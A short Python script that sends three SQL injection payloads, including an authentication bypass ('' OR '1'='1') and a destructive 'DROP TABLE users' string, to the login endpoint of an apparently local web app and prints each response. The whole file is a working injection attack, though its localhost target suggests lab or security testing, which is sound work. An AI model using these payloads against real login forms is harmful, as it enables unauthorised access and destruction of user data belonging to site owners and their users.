#!/usr/bin/env python3
import requests

base = "http://localhost:5001"

payloads = [
    "admin'--",
    "' OR '1'='1",
    "'; DROP TABLE users;--"
]

for p in payloads:
    r = requests.post(base + "/login", data={"username": p, "password": "x"})
    print(p, "=>", r.text)
